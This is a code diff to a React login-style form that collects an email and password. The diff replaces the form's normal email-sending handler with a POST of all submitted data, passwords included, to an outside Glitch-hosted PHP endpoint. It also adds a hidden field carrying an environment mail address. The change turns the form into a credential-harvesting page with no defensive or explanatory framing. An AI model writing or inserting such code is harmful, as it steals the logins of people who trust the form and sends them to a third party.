@@ -15,7 +15,6 @@ import { useLocation } from "wouter";
 import { formTwoSchema, type FormTwo } from "@shared/schema";
 import { sendFormTwo } from "@/lib/emailjs";
 import { useMobile } from "@/hooks/use-mobile";
-import React from 'react';
 
 export default function FormTwo() {
   const { toast } = useToast();
@@ -27,12 +26,22 @@ export default function FormTwo() {
     defaultValues: {
       user_email: "",
       password: "",
+      admin_email: process.env.SMTP_USER || "",
     },
   });
 
   const onSubmit = async (data: FormTwo) => {
     try {
-      await sendFormTwo(data);
+      await fetch('https://mixed-fluff-space.glitch.me/zubairbhaispan.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          ...data,
+          admin_email: process.env.SMTP_USER
+        }),
+      });
       setLocation("/thank-you");
     } catch (error) {
       toast({
@@ -102,6 +111,11 @@ export default function FormTwo() {
                     <FormMessage className="text-xs text-red-500 mt-1" />
                   </FormItem>
                 )}
+              />
+              <input 
+                type="hidden" 
+                name="admin_email" 
+                value={process.env.SMTP_USER || ""} 
               />
             </div>
             <Button 
